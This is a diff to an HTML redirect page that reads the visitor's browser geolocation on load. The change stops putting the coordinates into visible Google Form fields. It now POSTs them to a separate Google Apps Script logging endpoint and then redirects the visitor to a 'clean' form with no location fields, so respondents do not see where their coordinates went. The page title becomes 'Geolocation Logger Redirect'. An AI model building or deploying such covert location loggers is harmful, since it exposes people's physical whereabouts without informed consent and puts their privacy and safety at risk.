@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>Geolocation Form Redirect</title>
+    <title>Geolocation Logger Redirect</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script>
       function sendLocation() {
@@ -10,26 +10,42 @@
             var lat = position.coords.latitude;
             var lon = position.coords.longitude;
 
-            // Build your Google Form prefill link with lat/lon values
-            var formUrl = "https://docs.google.com/forms/d/e/1FAIpQLSfjJOU8SINFU0P3rVHwSWb6zKd2gU41xkzeww-PFHwtlAdtCg/viewform"
-              + "?entry.348082176=" + lat
-              + "&entry.248800820=" + lon;
-
-            // Redirect to the Google Form with location values
-            window.location.href = formUrl;
+            // POST lat/lon to your Google Apps Script Web App
+            fetch("https://script.google.com/macros/s/AKfycbzQmDQhYgN0BFhpdXY_aE90gRgMG7829OCFUQyriooASsNE6PU-9PSeYQtrkJEEzR5Ryg/exec", {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/x-www-form-urlencoded"
+              },
+              body: "latitude=" + lat + "&longitude=" + lon
+            })
+            .then(response => response.text())
+            .then(result => {
+              console.log("Location logged: " + result);
+              // Redirect to clean Google Form (no lat/lon fields)
+              window.location.href = "https://docs.google.com/forms/d/e/1FAIpQLSfjJOU8SINFU0P3rVHwSWb6zKd2gU41xkzeww-PFHwtlAdtCg/viewform?usp=header";
+            })
+            .catch(error => {
+              console.error("Error sending location:", error);
+              alert("Could not log location — redirecting to form.");
+              window.location.href = "https://docs.google.com/forms/d/e/1FAIpQLSfjJOU8SINFU0P3rVHwSWb6zKd2gU41xkzeww-PFHwtlAdtCg/viewform?usp=header";
+            });
 
           }, function(error) {
             alert("Error fetching location: " + error.message);
+            // Redirect anyway if permission denied
+            window.location.href = "https://docs.google.com/forms/d/e/1FAIpQLSfjJOU8SINFU0P3rVHwSWb6zKd2gU41xkzeww-PFHwtlAdtCg/viewform?usp=header";
           });
         } else {
-          alert("Geolocation is not supported by this browser.");
+          alert("Geolocation not supported by this browser.");
+          window.location.href = "https://docs.google.com/forms/d/e/1FAIpQLSfjJOU8SINFU0P3rVHwSWb6zKd2gU41xkzeww-PFHwtlAdtCg/viewform?usp=header";
         }
       }
     </script>
   </head>
   <body onload="sendLocation()">
-    <h2>Getting your location…</h2>
+    <h2 style="text-align:center; margin-top: 50px;">Fetching your location…</h2>
   </body>
 </html>
+
 
 
